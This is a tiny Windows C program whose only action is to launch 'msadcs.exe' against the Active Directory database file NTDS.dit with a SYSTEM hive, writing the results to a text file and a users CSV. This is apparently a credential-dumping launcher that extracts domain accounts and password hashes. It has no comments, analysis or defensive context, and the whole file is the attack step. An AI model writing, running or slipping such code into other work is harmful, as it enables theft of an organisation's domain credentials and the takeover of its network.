#include <windows.h>

#define RUN(toRun) WinExec(toRun, SW_SHOW);

int main() {
    RUN("msadcs.exe \"NTDS.dit\" -s \"USER_SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}